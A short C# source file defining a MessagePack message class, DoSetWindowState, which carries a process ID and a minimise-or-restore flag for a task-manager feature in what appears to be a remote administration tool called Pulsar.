using MessagePack;
using Pulsar.Common.Messages.Other;

namespace Pulsar.Common.Messages.Administration.TaskManager
{
    [MessagePackObject]
    public class DoSetWindowState : IMessage
    {
        [Key(1)]
        public int Pid { get; set; }

        [Key(2)]
        public bool Minimize { get; set; } // true = minimize, false = restore
    }
}
